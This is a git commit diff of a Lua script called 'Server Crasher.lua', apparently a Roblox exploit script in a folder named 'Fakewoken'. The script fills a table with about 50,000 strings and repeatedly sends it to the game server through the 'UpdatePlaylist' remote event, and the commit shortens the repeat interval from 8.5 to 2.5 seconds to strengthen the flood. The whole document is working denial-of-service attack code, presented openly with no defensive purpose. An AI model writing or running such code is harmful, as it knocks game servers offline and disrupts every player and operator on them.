cf45e18c4dc51beeaa8a0de92da7eb2ae0e7d2e2
MimiTest2 <91503103+MimiTest2@users.noreply.github.com>
2024-04-17 22:44:46 -0400

    Update Server Crasher.lua

--- Fakewoken/Server Crasher.lua
+++ Fakewoken/Server Crasher.lua
@@ -1,11 +1,11 @@
 local crashTable = {};
 local playlist = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("UpdatePlaylist");
 
-for i = 1, 50000 do
+for i = 1, 49999 do
     crashTable[i] = "Jam";
 end;
 
-while task.wait(8.5) do
+while task.wait(2.5) do
     task.spawn(function()
         playlist:InvokeServer(crashTable);
     end);
